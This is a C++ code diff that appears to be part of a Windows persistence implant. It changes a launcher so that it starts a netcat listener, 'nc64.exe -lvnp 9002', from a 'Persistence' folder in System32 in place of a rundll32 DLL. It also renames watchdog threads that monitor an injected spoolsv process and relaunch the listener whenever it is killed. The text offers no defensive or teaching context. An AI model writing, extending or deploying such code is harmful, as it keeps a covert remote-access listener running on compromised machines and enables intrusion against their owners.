@@ -20,10 +20,10 @@ void Init() {
 
     Sleep(5000);
 
-    CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");
+    CreateProc("listener", "C:\\Windows\\System32\\Persistence\\nc64.exe -lvnp 9002");
 
-    std::thread guardThread(Guard, spoolsvPID);
-    std::thread guardDLLThread(GuardRunDLL);
+    std::thread guardThread(GuardInj, spoolsvPID);
+    std::thread guardDLLThread(GuardRun);
 
     guardThread.join();
     guardDLLThread.join();
@@ -196,7 +196,7 @@ int ProcessInjection(DWORD targetPID, std::wstring dllPath) {
     return 0;
 }
 
-void Guard(DWORD pid) {
+void GuardInj(DWORD pid) {
     while (true) {
         HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
         std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);
@@ -220,9 +220,9 @@ void Guard(DWORD pid) {
     }
 }
 
-void GuardRunDLL() {
+void GuardRun() {
     while (true) {
-        DWORD pid = FindTarget(L"rundll32.exe");
+        DWORD pid = FindTarget(L"nc64.exe");
 
         HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
         std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);
@@ -239,9 +239,9 @@ void GuardRunDLL() {
             return;
         }
 
-        Log("[*] RunDLL32 pid " + std::to_string(pid) + " closed. Rerunning", componentName);
+        Log("[*] pid " + std::to_string(pid) + " closed. Rerunning", componentName);
 
-        CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");
+        CreateProc("listener", "C:\\Windows\\System32\\Persistence\\nc64.exe");
     }
 }
 
